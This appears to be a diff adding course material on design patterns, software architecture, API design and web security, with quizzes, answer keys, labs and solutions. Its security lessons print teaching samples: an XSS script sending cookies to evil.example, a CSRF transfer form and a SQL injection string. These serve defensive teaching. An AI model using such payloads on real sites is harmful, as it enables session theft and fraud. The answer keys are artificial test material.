+#Q Which pattern wraps an object to add behaviour while keeping the same interface?
+- Adapter
+* Decorator
+- Factory
+! Decorators add responsibilities and can be stacked.
+#Q Web middleware, where a request passes through logging, then authentication, then the handler, is an example of which pattern?
+* Chain of responsibility
+- Singleton
+- Builder
+! Each handler acts and passes the request on.
+#Q What does the "rule of three" suggest?
+- Classes should have three methods
+* Refactor duplication when it appears a third time, once the real pattern is clear
+- Every function needs three tests
+! Abstracting too early risks the wrong abstraction.
+#Q In dependency inversion, who owns the interface that the database code implements?
+- The database library
+* The business logic that needs it
+- The operating system
+! The high-level policy defines what it requires; details conform.
+#C js | Write `compose(...fns)` that returns a function applying the given functions from left to right. `compose(f, g)(x)` equals `g(f(x))`. With no functions it returns its argument unchanged.
+@starter
+function compose(...fns) {
+  return (x) => x;
+}
+@solution
+function compose(...fns) {
+  return (x) => fns.reduce((value, fn) => fn(value), x);
+}
+@tests
+compose((n) => n + 1, (n) => n * 2)(3) => 8
+compose()(5) => 5
+compose((s) => s.trim(), (s) => s.toUpperCase())("  hi ") => "HI"
+compose((n) => n * 2, (n) => n + 1, (n) => n * n)(1) => 9
+#W A function calculates shipping cost with a long if/else chain over the carrier name (four carriers so far, and a fifth is requested). Describe how you would refactor it, which pattern you would use, which SOLID principles the change serves, and how you would make the change safely.
++ Proposes a strategy per carrier (or polymorphism) behind a common interface
++ Explains that adding a carrier then requires new code, not edits (open/closed)
++ Mentions single responsibility or dependency on an abstraction
++ Describes writing or confirming tests before refactoring
++ Describes small steps with tests run between them
+
+#PROJECT Plugin-based notification system
+Build a notification system that can send a message through several channels (for example console, file, and a simulated email and SMS), where new channels can be added without changing existing code.
+@requirements
+A common channel interface with at least four implementations
+Channels are discovered or registered, not hard-coded in an if chain
+Decorators add retry and logging to any channel
+An observer or event mechanism reports delivery results
+The core logic depends only on abstractions and is tested with fakes
+A short document maps each design decision to a SOLID principle or pattern
+@deliverables
+The source and tests
+A class diagram
+The design document
+@rubric
+Adding a channel requires no change to existing code | 30
+Patterns are used appropriately, without over-engineering | 25
+Tests use fakes and cover failure cases | 20
+The design document is accurate | 15
+Code quality | 10
+
+#COURSE c303
+#LESSON Layered architecture and MVC | 13
+**Software architecture** is the set of decisions that are expensive to change later: how the system is divided into parts, what each part is responsible for, and how they communicate. Its purpose is to let a system keep changing without collapsing under its own complexity.
+
+### Separation of concerns
+The oldest and most useful idea: different kinds of work go in different places. The standard division is into **layers**.
+
+```diagram
+  +---------------------------------------------+
+  |  Presentation   (HTTP handlers, pages, CLI) |
+  +---------------------------------------------+
+  |  Application    (use cases, orchestration)  |
+  +---------------------------------------------+
+  |  Domain         (business rules, entities)  |
+  +---------------------------------------------+
+  |  Infrastructure (database, email, files)    |
+  +---------------------------------------------+
+```
+
+- **Presentation** translates between the outside world and the application.
+- **Application** coordinates a use case: "place an order".
+- **Domain** holds the rules of the business. It is the reason the software exists.
+- **Infrastructure** talks to databases and other systems.
+
+The rule: a layer may call the layer below, never the layer above.
+
+### MVC
+**Model-View-Controller** is the same idea for user interfaces.
+
+- The **model** is the data and rules.
+- The **view** displays it.
+- The **controller** takes input, asks the model to act and chooses a view.
+
+Most web frameworks follow it or a close variant.
+
+### Pointing dependencies inward
+Applying dependency inversion to the layers gives **hexagonal architecture** (also "ports and adapters" or "clean architecture"). The domain sits at the centre and depends on nothing. It defines **ports** (interfaces for what it needs). **Adapters** on the outside implement them.
+
+```diagram
+        web adapter ----\             /---- database adapter
+                         >  DOMAIN  <
+        CLI adapter ----/             \---- email adapter
+```
+
+The business rules can then be tested without a database or web server, and those details can be replaced.
+
+### Architecture is trade-offs
+Every structure buys something and costs something. Layers add indirection. For a small script they are overhead; for a system maintained for ten years by a team they are survival. The skill is matching the structure to the problem.
+
+> In industry: "Where should this code live?" is asked daily. A clear architecture gives the same answer whoever you ask.
+#Q In a layered architecture, which layer contains the business rules?
+- Presentation
+* Domain
+- Infrastructure
+! The domain is the core; the other layers serve it.
+#Q What is the main benefit of having the domain depend on nothing outside itself?
+- It runs faster
+* Business rules can be tested and kept stable while databases and frameworks change
+- It needs fewer files
+! Details depend on the core, not the reverse.
+
+#LESSON REST API design | 14
+You have built endpoints. Designing an API that others can use correctly for years takes more care. An API is a **contract**; once clients depend on it, every change is costly.
+
+### Model resources, not actions
+URLs name **things**; methods say what to do with them.
+
+| Poor | Better |
+|---|---|
+| `POST /createUser` | `POST /users` |
+| `GET /getOrders?user=5` | `GET /users/5/orders` |
+| `POST /cancelOrder?id=9` | `POST /orders/9/cancellation` |
+
+Use plural nouns, and nest only to show real ownership.
+
+### Method semantics
+- **Safe** methods do not change anything: `GET`.
+- **Idempotent** methods have the same effect whether sent once or many times: `GET`, `PUT`, `DELETE`. This matters because networks fail and clients retry.
+- `POST` is neither. Sending "create order" twice may create two orders. The fix is an **idempotency key**: the client sends a unique value with the request, and the server performs the action only once for that value.
+
+### Status codes that tell the truth
+`201` with a `Location` header for created resources. `204` for success with no body. `400` malformed. `401` not authenticated. `403` not allowed. `404` not found. `409` conflict with the current state. `422` well-formed but invalid. `429` too many requests.
+
+### Consistent errors
+Return errors in one documented shape that a program can act on:
+
+```text
+{ "error": { "code": "insufficient_stock", "message": "Only 2 left", "field": "quantity" } }
+```
+
+### Lists
+Never return an unbounded list. Use **pagination** (`?limit=20&cursor=abc`), and support **filtering** and **sorting** through query parameters.
+
+### Versioning
+You will need to make breaking changes eventually. Put a version in the path (`/v1/users`) or a header, and keep old versions working for a published period. **Adding** a field is safe; **removing or renaming** one is breaking.
+
+### Document it
+An **OpenAPI** description lists every endpoint, parameter and response. It generates documentation and client libraries, and can be checked automatically against the real API.
+
+### Design for the client
+Write the request and response examples before any code. Read them as the person who must use them, with no knowledge of your database. If something needs explaining, redesign it.
+
+> In industry: Public APIs are kept compatible for many years. Careful design at the start is far cheaper than supporting a mistake indefinitely.
+#Q What does it mean for an HTTP method to be idempotent?
+- It never changes data
+* Sending the same request several times has the same effect as sending it once
+- It requires authentication
+! This makes retries after a network failure safe.
+#Q Which change to an API response is safe for existing clients?
+* Adding a new optional field
+- Renaming a field
+- Removing a field
+! Clients that ignore unknown fields keep working.
+
+#LESSON GraphQL | 12
+REST exposes many endpoints, each returning a fixed shape. Clients often get too much (**over-fetching**) or must make several requests to assemble one screen (**under-fetching**). **GraphQL**, created at Facebook, takes a different approach: one endpoint, and the client states exactly what it wants.
+
+```text
+query {
+  user(id: 5) {
+    name
+    orders(last: 3) {
+      total
+      items { product { name } }
+    }
+  }
+}
+```
+
+The response has exactly that shape, in one round trip.
+
+### The schema
+A GraphQL API is defined by a typed **schema**.
+
+```text
+type User {
+  id: ID!
+  name: String!
+  orders(last: Int): [Order!]!
+}
+type Query { user(id: ID!): User }
+type Mutation { createOrder(input: OrderInput!): Order! }
+```
+
+`!` means "never null". **Queries** read; **mutations** change data; **subscriptions** push updates. The schema is the contract, and tools use it to validate queries and generate typed client code.
+
+### Resolvers
+For each field, the server has a **resolver** function that returns its value. The server walks the query, calling resolvers.
+
+### The N+1 problem
+A naive implementation fetching 50 users and then each user's orders runs 1 query for the users and 50 for the orders. The standard cure is **batching**: collect the keys requested during one step and fetch them in a single query (the "DataLoader" technique).
+
+### What GraphQL costs
+- **Caching is harder.** REST leans on HTTP caching by URL; GraphQL usually posts to one URL.
+- **Unbounded queries.** A client can ask for something enormously expensive. Servers must limit query depth and complexity.
+- **More machinery** on both sides.
+- **Authorization** must be checked for every field, not every endpoint.
+
+### Choosing
+| Situation | Leaning |
+|---|---|
+| Many different clients, each needing different data | GraphQL |
+| Simple resources, public API, strong caching needs | REST |
+| Internal service-to-service calls needing speed | gRPC (binary, typed) |
+
+They are tools for different jobs, and many companies run more than one.
+
+> Key idea: REST puts the server in charge of response shapes. GraphQL puts the client in charge. Neither is free.
+#Q What problem of REST does GraphQL primarily address?
+- Slow servers
+* Over-fetching and under-fetching, by letting the client specify exactly the data it needs
+- The lack of status codes
+! One request returns precisely the requested shape.
+#Q What is the N+1 problem?
+- Having one endpoint too many
+* Running one query for a list and then one more for each item in it
+- A version numbering mistake
+! Batching the lookups reduces N+1 queries to two.
+
+#LESSON Event-driven architecture | 13
+In the architectures so far, one component calls another and waits for the answer. That is **synchronous** request and response. It is simple, but it **couples** the caller to the callee: if the email service is slow, placing an order is slow; if it is down, orders fail.
+
+In an **event-driven architecture**, components announce that something happened and carry on. Whoever is interested reacts in their own time.
+
+```diagram
+                       +---> inventory service  (reserve stock)
+  order service        |
+   emits event    -----+---> email service      (send confirmation)
+  "OrderPlaced"        |
+                       +---> analytics          (update dashboard)
+```
+
+An **event** is a record of a fact in the past tense: `OrderPlaced`, `PaymentFailed`. The producer does not know who consumes it. Adding a new reaction needs no change to the producer.
+
+### The pieces
+- **Producers** publish events.
+- A **broker** (RabbitMQ, Kafka, a cloud queue service) stores and routes them.
+- **Consumers** subscribe and process them.
+
+### What you gain
+- **Loose coupling.** Components evolve independently.
+- **Resilience.** If a consumer is down, events wait in the broker.
+- **Scalability.** Add consumers to handle load; absorb spikes by queueing.
+- **Extensibility.** New features subscribe to existing events.
+
+### What it costs
+- **Eventual consistency.** For a moment the order exists but the email has not gone and stock is not yet reserved. The system is consistent *eventually*, not instantly, and the user interface must allow for that.
+- **Harder to follow.** No single place shows the whole flow. Tracing tools become essential.
+- **Duplicates and ordering.** Brokers usually deliver **at least once**, so a consumer may see the same event twice and must be **idempotent**. Events may arrive out of order.
+- **Failure handling.** If step three fails after steps one and two succeeded, there is no automatic rollback. You must design **compensating actions**.
+
+### Commands and events
+A **command** asks for something to be done and may be refused (`PlaceOrder`). An **event** states that something did happen and cannot be refused (`OrderPlaced`). Keeping them distinct keeps designs clear.
+
+### When to use it
+Use events where work can happen later, where several parts react to the same fact, or where load is bursty. Keep plain calls where the caller truly needs the answer now.
+
+> In industry: Most large systems are hybrids: synchronous calls for the user-facing path, events for everything that can happen afterwards.
+#Q What is the main coupling benefit of event-driven architecture?
+- Events are faster than function calls
+* The producer does not need to know which components react to an event
+- No broker is required
+! New consumers can be added without touching the producer.
+#Q Why must event consumers be idempotent?
+- Events are always lost
+* Brokers typically deliver at least once, so the same event may arrive more than once
+- Idempotent code is shorter
+! Processing a duplicate must not repeat its effect.
+
+#LESSON Choosing and documenting an architecture | 12
+There is no best architecture, only the one that best fits a particular set of needs.
+
+### Start from quality attributes
+Features say what a system does. **Quality attributes** say how well, and they are what architecture actually decides:
+
+| Attribute | Question |
+|---|---|
+| Performance | How fast must it respond? |
+| Scalability | How much growth must it absorb? |
+| Availability | How much downtime is acceptable? |
+| Security | What must be protected, from whom? |
+| Maintainability | How easily can it be changed? |
+| Testability | How easily can it be verified? |
+| Cost | What can we afford to build and run? |
+
+They conflict. More security often costs convenience; more availability costs money and complexity. Architecture is choosing which to favour.
+
+### Common overall styles
+- **Monolith:** one deployable application. Simple to build, test and run. The right default for most new products.
+- **Modular monolith:** one deployable, with strict internal module boundaries. Most of the benefits of separation, few of the costs.
+- **Microservices:** many small services deployed independently. Suits large organisations with many teams. Stage 4 covers the considerable costs.
+- **Serverless:** small functions run by a cloud provider on demand.
+
+### Record decisions
+An **Architecture Decision Record** (ADR) is a short document, kept with the code, for each significant decision:
+
+```text
+ADR 7: Use PostgreSQL for order storage
+Status: accepted
+Context: orders need transactions and reporting queries; the team knows SQL.
+Decision: PostgreSQL, one database, accessed only through the order module.
+Alternatives: MongoDB (weaker multi-record transactions for our use), SQLite (single writer).
+Consequences: we must run and back up a database server; reporting is straightforward.
+```
+
+Future engineers can then understand *why*, and judge whether the reasons still hold.
+
+### Draw it
+The **C4 model** suggests four zoom levels: system **context** (your system and what it talks to), **containers** (applications and databases), **components** inside each container, and code. The first two are the ones worth keeping up to date.
+
+### Defer what you can
+A good architecture lets you postpone decisions. If the domain depends only on a repository interface, the choice of database can wait and can change. Keep options open cheaply, and commit when you have information.
+
+### Evolve
+Start with the simplest structure that meets today's needs, keep it clean, and change it when real needs appear. Predicting needs years ahead mostly produces complexity for problems you never have.
+
+> In industry: Engineers become senior partly by learning to say "it depends", and then to say exactly what it depends on.
+#Q What mainly drives architectural decisions?
+- The list of features
+* Quality attributes such as performance, availability, security and maintainability
+- The programming language's popularity
+! Features can usually be built under any architecture; qualities cannot.
+#Q What is the purpose of an architecture decision record?
+- To list all the bugs in a system
+* To capture a significant decision with its context, alternatives and consequences
+- To replace code comments
+! It preserves the reasoning for future maintainers.
+
+#LAB js | A tiny router and request handler
+Build the core of a web framework as pure functions, with no network.
+
+A **request** is `{ method, path, body }`. A **response** is `{ status, body }`.
+
+Write a class `Router`:
+
+- `add(method, pattern, handler)` registers a handler. A pattern is a path such as `"/users"` or `"/users/:id"`, where a segment starting with `:` matches any single segment and captures it.
+- `handle(request)` finds the first registered route whose method and pattern match, calls `handler(request, params)` and returns its result. `params` is an object of the captured values, for example `{ id: "42" }`.
+- If the path matches some route but with a different method, return `{ status: 405, body: { error: "method not allowed" } }`.
+- If no route matches the path, return `{ status: 404, body: { error: "not found" } }`.
+- If a handler throws, return `{ status: 500, body: { error: "internal error" } }`.
+
+Paths have no query strings and no trailing slashes, and segments are compared exactly.
+@starter
+class Router {
+  constructor() {
+    this.routes = [];
+  }
+
+  add(method, pattern, handler) {
+  }
+
+  handle(request) {
+    return { status: 404, body: { error: "not found" } };
+  }
+}
+@solution
+class Router {
+  constructor() {
+    this.routes = [];
+  }
+
+  add(method, pattern, handler) {
+    this.routes.push({ method, parts: pattern.split("/"), handler });
+  }
+
+  match(parts, path) {
+    const segs = path.split("/");
+    if (segs.length !== parts.length) return null;
+    const params = {};
+    for (let i = 0; i < parts.length; i++) {
+      if (parts[i].startsWith(":")) params[parts[i].slice(1)] = segs[i];
+      else if (parts[i] !== segs[i]) return null;
+    }
+    return params;
+  }
+
+  handle(request) {
+    let pathMatched = false;
+    for (const route of this.routes) {
+      const params = this.match(route.parts, request.path);
+      if (params === null) continue;
+      pathMatched = true;
+      if (route.method !== request.method) continue;
+      try {
+        return route.handler(request, params);
+      } catch (e) {
+        return { status: 500, body: { error: "internal error" } };
+      }
+    }
+    return pathMatched
+      ? { status: 405, body: { error: "method not allowed" } }
+      : { status: 404, body: { error: "not found" } };
+  }
+}
+@tests
+(() => { const r = new Router(); r.add("GET", "/users", () => ({ status: 200, body: ["ada"] })); return r.handle({ method: "GET", path: "/users" }); })() => {"status": 200, "body": ["ada"]}
+(() => { const r = new Router(); r.add("GET", "/users/:id", (req, p) => ({ status: 200, body: p })); return r.handle({ method: "GET", path: "/users/42" }); })() => {"status": 200, "body": {"id": "42"}}
+(() => { const r = new Router(); r.add("GET", "/a/:x/b/:y", (req, p) => ({ status: 200, body: p })); return r.handle({ method: "GET", path: "/a/1/b/2" }).body; })() => {"x": "1", "y": "2"}
+(() => { const r = new Router(); r.add("GET", "/users", () => ({ status: 200, body: 1 })); return r.handle({ method: "GET", path: "/nope" }); })() => {"status": 404, "body": {"error": "not found"}}
+(() => { const r = new Router(); r.add("GET", "/users", () => ({ status: 200, body: 1 })); return r.handle({ method: "DELETE", path: "/users" }); })() => {"status": 405, "body": {"error": "method not allowed"}}
+(() => { const r = new Router(); r.add("GET", "/users", () => { throw new Error("boom"); }); return r.handle({ method: "GET", path: "/users" }); })() => {"status": 500, "body": {"error": "internal error"}}
+(() => { const r = new Router(); r.add("GET", "/users", () => ({ status: 200, body: "list" })); r.add("POST", "/users", (req) => ({ status: 201, body: req.body })); return r.handle({ method: "POST", path: "/users", body: { name: "ada" } }); })() => {"status": 201, "body": {"name": "ada"}}
+(() => { const r = new Router(); r.add("GET", "/users/:id", () => ({ status: 200, body: 1 })); return r.handle({ method: "GET", path: "/users/1/extra" }).status; })() => 404
+(() => { const r = new Router(); r.add("GET", "/users/me", () => ({ status: 200, body: "me" })); r.add("GET", "/users/:id", () => ({ status: 200, body: "id" })); return r.handle({ method: "GET", path: "/users/me" }).body; })() => "me"
+@hints
+Split both the pattern and the path on `/` and compare them segment by segment.
+A pattern segment starting with `:` matches anything and records the value under the name after the colon.
+A path with a different number of segments cannot match.
+Track separately whether any route matched the **path**: that decides between 404 and 405.
+Wrap the handler call in `try` / `catch` to produce the 500 response.
+
+#EXAM 20
+#Q Which layer should know about HTTP status codes?
+* Presentation
+- Domain
+- Infrastructure
+! Translating to and from the outside world is the presentation layer's job.
+#Q In hexagonal architecture, what is a port?
+- A network socket number
+* An interface the domain defines for something it needs from outside
+- A database table
+! Adapters implement ports.
+#Q Which method should be used to replace a resource in full?
+- POST
+* PUT
+- GET
+! PUT is idempotent: repeating it leaves the same state.
+#Q A client retries "create payment" after a timeout. What prevents a double charge?
+- A faster server
+* An idempotency key sent with the request
+- A longer timeout
+! The server recognises the repeated key and performs the action once.
+#Q What defines the contract of a GraphQL API?
+- Its list of URLs
+* Its typed schema
+- Its status codes
+! Queries are validated against the schema.
+#Q Which statement about event-driven systems is true?
+- All parts are updated at the same instant
+* The system is eventually consistent, so there is a delay before all parts reflect a change
+- Events can be refused by consumers
+! Reactions happen asynchronously.
+#Q Which is the sensible default architecture for a new product with a small team?
+* A monolith, kept modular
+- Dozens of microservices
+- A separate database per function
+! Simplicity first; distribution adds heavy operational cost.
+#W Your team must choose between REST and GraphQL for the API of a new mobile and web application with complex, nested data and several different screens. Argue for one, state the costs of your choice, and describe one thing you would do to limit those costs.
++ Makes a clear choice linked to the stated needs
++ Explains over-fetching or under-fetching accurately
++ States real costs of the chosen approach
++ Proposes a concrete mitigation (query limits, batching, caching, versioning)
++ Acknowledges when the other option would be better
+
+#PROJECT REST API with a database
+Design and build a REST API for a domain of your choice with at least three related resources, backed by a relational database.
+@requirements
+An OpenAPI description (or equally precise document) written before the code
+Layered structure: handlers, application logic, domain rules and data access are separate
+Correct methods and status codes, consistent error format, pagination on lists
+Validation of all input; parameterised queries
+At least one endpoint that is safe to retry through an idempotency key
+Automated tests at unit and integration level
+Two architecture decision records
+@deliverables
+The repository
+The API description
+The ADRs and a container-level diagram
+The test run output
+@rubric
+API design quality and consistency | 25
+Architecture and separation of concerns | 25
+Correctness, validation and error handling | 20
+Tests | 15
+Documentation and decision records | 15
+
+#COURSE c304
+#LESSON Passwords and identity | 13
+**Authentication** answers "who are you?". Getting it wrong exposes every user, so the rules here are strict.
+
+### The three kinds of proof
+- **Something you know:** a password.
+- **Something you have:** a phone, a hardware key.
+- **Something you are:** a fingerprint.
+
+**Multi-factor authentication** (MFA) requires two different kinds, so a stolen password alone is not enough. It is the single most effective protection against account takeover.
+
+### Storing passwords
+Databases get stolen. Assume yours will be. What the attacker finds should be useless.
+
+1. **Never store the password**, or anything reversible such as an encrypted password.
+2. Store a **hash** from a function designed for passwords: **Argon2id**, **scrypt** or **bcrypt**.
+3. Each password gets a unique random **salt**, stored beside the hash.
+
+```diagram
+  sign-up:   password + random salt  --slow hash-->  stored: (salt, hash)
+  sign-in:   attempt + stored salt   --slow hash-->  compare with stored hash
+```
+
+**Why slow?** An attacker with the stolen database guesses passwords and hashes each guess. A fast hash permits billions of guesses per second. A deliberately slow, memory-hungry one permits a few thousand, turning days into centuries.
+
+**Why salted?** Without salts, identical passwords have identical hashes, and an attacker can use a precomputed table of common passwords against every account at once. A salt makes each account a separate job.
+
+### Password rules that help
+Modern guidance (for example from NIST) favours **length** over forced complexity, **checking new passwords against lists of breached ones**, and **not** forcing regular changes. Allow long passphrases and pasting, so people can use password managers.
+
+### Defending the sign-in form
+- **Rate-limit** attempts per account and per address.
+- Reply identically whether the email or the password was wrong.
+- Compare secrets in **constant time**, so timing does not reveal how much matched.
+- Send password reset links that are random, single-use and short-lived.
+
+### Passkeys
+**Passkeys** (the WebAuthn standard) replace passwords with a key pair held by the user's device. The server stores only a public key, so there is nothing secret to steal and nothing to phish. They are steadily becoming the preferred option.
+
+> Key idea: Design as if your user database has already been stolen.
+#Q Why are password hashes salted?
+- To make the hash shorter
+* So identical passwords produce different hashes and precomputed tables are useless
+- To let the password be recovered later
+! Each account must then be attacked separately.
+#Q Why should a password hashing function be slow?
+- To save electricity
+* To make large-scale guessing impractical for an attacker with the stolen hashes
+- Because fast functions are less accurate
+! Each guess costs the attacker real time and memory.
+
+#LESSON Sessions and cookies | 12
+HTTP forgets everything between requests. After a user signs in, something must identify them on each later request. The traditional answer is the **session**.
+
+### How a session works
+```diagram
+  1. browser:  POST /login  (email, password)
+  2. server:   checks them, creates session "9f3a...e1" -> user 42, stores it
+  3. server:   Set-Cookie: sid=9f3a...e1; HttpOnly; Secure; SameSite=Lax
+  4. browser:  sends "Cookie: sid=9f3a...e1" with every later request
+  5. server:   looks up 9f3a...e1 -> user 42
+```
+
+The **session ID** is a long random string that means nothing by itself. All the information stays on the server, in memory, a database or a store such as Redis.
+
+### Cookie attributes
+- `HttpOnly`: JavaScript on the page cannot read the cookie, so a script-injection flaw cannot steal the session.
+- `Secure`: sent only over HTTPS.
+- `SameSite=Lax` or `Strict`: not sent on requests started by other websites.
+- A sensible expiry.
+
+### Attacks on sessions
+**Session hijacking:** stealing the ID. Defences: HTTPS everywhere, `HttpOnly`, and IDs with enough randomness to be unguessable.
+
+**Session fixation:** the attacker plants a known ID before the victim signs in. Defence: issue a **new** session ID at sign-in.
+
+**Cross-site request forgery (CSRF):** a malicious site causes the victim's browser to send a request to your site, and the browser attaches the cookie automatically.
+
+```html
+<!-- on evil.example -->
+<form action="https://bank.example/transfer" method="POST">
+  <input name="to" value="attacker"><input name="amount" value="1000">
+</form>
+```
+
+Defences: `SameSite` cookies, plus a **CSRF token**, a secret value embedded in your own forms that another site cannot know, checked on every state-changing request.
+
+### Ending sessions
+Sign-out must delete the session on the **server**, not only the cookie. Sessions should expire after inactivity, and all of a user's sessions should end when their password changes.
+
+### Strengths and limits
+Sessions are simple and can be revoked instantly by deleting them. The cost is a lookup on every request and shared session storage once you run several servers.
+
+> In industry: Server-side sessions with well-configured cookies remain the safest default for ordinary web applications.
+#Q What does the HttpOnly cookie attribute do?
+- Encrypts the cookie
+* Prevents JavaScript in the page from reading the cookie
+- Makes the cookie permanent
+! It limits the damage of a script-injection vulnerability.
+#Q What is a CSRF attack?
+- Guessing a user's password
+* Another site causing the user's browser to send an authenticated request the user did not intend
+- Reading the server's database directly
+! The browser attaches the cookie automatically; a token or SameSite prevents the forgery.
+
+#LESSON Tokens and JWT | 14
+With sessions, the server remembers who is signed in. With **tokens**, the server hands the client a signed statement and remembers nothing. The common format is the **JSON Web Token** (JWT, pronounced "jot").
+
+### Anatomy
+A JWT is three parts joined by dots: `header.payload.signature`, each base64url-encoded.
+
+```text
+header:    { "alg": "HS256", "typ": "JWT" }
+payload:   { "sub": "42", "role": "admin", "exp": 1767225600 }
+signature: HMAC-SHA256( header + "." + payload, secret )
+```
+
+The payload holds **claims**: `sub` (who the token is about), `exp` (expiry), `iat` (issued at), `aud` (who it is for), and anything else you add.
+
+The server verifies a token by recomputing the signature with its secret. If the payload was altered, the signature will not match.
+
+> Warning: A JWT is **signed, not encrypted**. Anyone holding it can read the payload. Never put secrets or sensitive personal data in it.
+
+### Verification checklist
+Every item is a real, exploited mistake when skipped.
+
+1. Verify the signature with a library, never by hand.
+2. **Fix the allowed algorithm on the server.** Do not trust the `alg` in the header: tokens declaring `"alg": "none"` have bypassed careless verifiers.
+3. Check `exp`.
+4. Check `aud` and `iss`, so a token issued for another service is refused.
+
+### The revocation problem
+A session can be deleted. A JWT is valid until it expires, wherever it is, because the server keeps no record. The standard design:
+
+- A short-lived **access token** (5 to 15 minutes).
+- A long-lived **refresh token**, stored securely and kept on record by the server so it can be revoked, exchanged for new access tokens.
+
+### Where to keep a token in a browser
+`localStorage` is readable by any script on the page, so one injection flaw leaks it. An `HttpOnly` cookie cannot be read by scripts but needs CSRF protection. For browser applications the cookie is generally the safer choice.
+
+### Sessions or tokens?
+| | Sessions | JWTs |
+|---|---|---|
+| State on the server | yes | no |
+| Instant revocation | yes | needs extra machinery |
+| Works across separate services | awkward | natural |
+| Size sent per request | small | larger |
+
+Tokens suit APIs called by mobile apps and other services, and systems of many services. Sessions suit a single web application.
+
+### OAuth 2.0 and OpenID Connect
+"Sign in with Google" is **OpenID Connect**, built on **OAuth 2.0**, a protocol letting a user grant an application limited access without sharing a password. Use a maintained library; the protocol has many subtle steps.
+#Q What protects a JWT's payload from being changed?
+- Encryption
+* The signature, which will not match if the payload is altered
+- The base64 encoding
+! Base64 is only an encoding; the signature provides integrity.
+#Q Why are access tokens given a short lifetime?
+- To save storage
+* Because a stolen token cannot easily be revoked, so its useful life should be brief
+- Because long tokens are slower to verify
+! A refresh token, which can be revoked, obtains new ones.
+
+#LESSON Authorization | 13
+Authentication established who the user is. **Authorization** decides what they may do. Broken access control is consistently ranked the most common serious web vulnerability.
+
+### Models
+**Role-based access control (RBAC).** Users have roles; roles have permissions.
+
+```diagram
+  user "ada" ---> role "editor" ---> permissions: article.read, article.write
+  user "tim" ---> role "viewer" ---> permissions: article.read
+```
+
+Check **permissions** in code, not role names: `can(user, "article.write")` survives a reorganisation of roles; `user.role === "editor"` does not.
+
+**Attribute-based access control (ABAC).** Decisions use attributes of the user, the resource and the context: "a doctor may view records of patients in their own department during working hours". More expressive, more complex.
+
+**Ownership.** Most applications also need "users may act only on their own things". This is the check most often forgotten.
+
+### The classic failure
+```js
+app.get("/invoices/:id", (req, res) => {
+  const invoice = db.findInvoice(req.params.id);
+  res.json(invoice);                      // any signed-in user can read any invoice
+});
+```
+
+Changing the number in the URL reveals other people's data. This is an **insecure direct object reference**. The fix is a check on every access:
+
+```js
+if (invoice.ownerId !== req.user.id && !can(req.user, "invoice.read.any")) {
+  return res.status(404).end();
+}
+```
+
+Returning 404 instead of 403 avoids confirming that the invoice exists.
+
+### Principles
+- **Deny by default.** Access is refused unless a rule grants it. A forgotten check then fails closed.
+- **Least privilege.** Give each user and each service the minimum it needs.
+- **Enforce on the server, every time.** Hiding a button is not access control.
+- **Centralise.** Put the rules in one policy module and call it everywhere, so they can be read, tested and audited.
+- **Check the object, not only the action.** "May edit articles" is not "may edit *this* article".
+
+### Privilege escalation
+**Vertical** escalation is gaining a higher role's powers. **Horizontal** is reaching another user's data at the same level. A frequent cause of the first is **mass assignment**: copying every field of a request onto a record, so a user who adds `"role": "admin"` to their profile update becomes one. Accept only an explicit list of fields.
+
+### Test it
+For each role, write tests for what it must **not** be able to do. Authorization bugs are invisible in normal use; only negative tests find them.
+#Q What does "deny by default" mean?
+- Every request is refused
+* Access is refused unless a rule explicitly allows it
+- Administrators are denied access
+! A missing rule then results in refusal, not exposure.
+#Q A user edits the ID in a URL and sees another user's record. What was missing?
+- A stronger password policy
+* An ownership or permission check on that specific object
+- HTTPS
+! The server verified identity but not the right to that resource.
+
+#LESSON Common web vulnerabilities | 14
+Three classes of flaw account for much real-world damage. All come from the same root: **treating untrusted input as trusted**.
+
+### Injection
+When data is pasted into a command, an attacker can supply data that changes the command.
+
+```js
+// vulnerable
+db.query("SELECT * FROM users WHERE email = '" + email + "'");
+// email = "' OR '1'='1"  makes the WHERE always true
+```
+
+The fix is a **parameterised query**: the SQL and the values travel separately, so a value can never become code.
+
+```js
+db.query("SELECT * FROM users WHERE email = ?", [email]);
+```
+
+The same flaw appears as command injection (building shell commands) and others. The rule is always: keep code and data separate.
+
+### Cross-site scripting (XSS)
+If a page includes user-supplied text without escaping, an attacker can make it include a script, which then runs in other users' browsers with their privileges.
+
+```html
+<p>Hello, <script>fetch("https://evil.example/?c=" + document.cookie)</script></p>
+```
+
+Defences:
+
+- **Escape output** for the context it goes into. Template engines do this by default; do not switch it off.
+- Use `textContent`, not `innerHTML`, for untrusted text.
+- Add a **Content Security Policy** header limiting where scripts may come from.
+- Mark session cookies `HttpOnly`.
+
+### Cross-site request forgery
+Covered with sessions: `SameSite` cookies and anti-forgery tokens.
+
+### Other frequent problems
+- **Security misconfiguration:** default passwords, debug mode in production, storage left open to the public.
+- **Vulnerable dependencies:** most of your application is other people's code. Keep it updated and scan it.
+- **Sensitive data exposure:** secrets in repositories, personal data in logs, missing HTTPS.
+- **Server-side request forgery:** an attacker makes your server fetch a URL of their choosing, reaching internal systems.
+
+### Validate input, encode output
+- **Validate** on arrival against what you expect (type, length, range, format), preferring an allow-list of what is permitted over a block-list of what is not.
+- **Encode** on the way out for the destination: HTML, SQL parameter, URL, shell.
+
+Validation alone is not enough, because the same text is safe in one context and dangerous in another.
+
+### Defence in depth
+Use several independent layers so that one failure is not a breach: validation, parameterised queries, escaping, a content security policy, least-privilege database accounts, monitoring.
+
+> In industry: The OWASP Top Ten is the standard list teams measure themselves against. Stage 4 has a full course on security engineering.
+#Q What is the correct defence against SQL injection?
+- Removing quote characters from input
+* Parameterised queries, which keep data separate from the SQL code
+- Hiding the database behind a firewall
+! A parameter can never be interpreted as SQL.
+#Q What does cross-site scripting allow an attacker to do?
+- Read the server's source code
+* Run their script in other users' browsers within your site
+- Shut down the database
+! The script acts with the victim's session and permissions.
+
+#LAB js | An access-control policy module
+Write the central policy module of an application.
+
+Roles and their permissions:
+
+| Role | Permissions |
+|---|---|
+| `viewer` | `doc.read` |
+| `editor` | `doc.read`, `doc.write` |
+| `admin` | `doc.read`, `doc.write`, `doc.delete`, `user.manage` |
+
+A **user** is `{ id, roles }` where `roles` is an array (a user may have several). A **document** is `{ id, ownerId, published }`.
+
+- `can(user, permission)` returns true if any of the user's roles grants the permission. An unknown role grants nothing. A missing user (`null`) can do nothing.
+- `canReadDoc(user, doc)`: anyone, including `null`, may read a **published** document. An unpublished one may be read only by its owner, or by a user with `doc.delete` (administrators).
+- `canEditDoc(user, doc)`: requires `doc.write` **and** being the owner, unless the user has `doc.delete`.
+- `sanitizeUpdate(input)` returns a new object containing only the fields `title` and `body` from `input`, if present. Every other field is dropped (this prevents mass assignment).
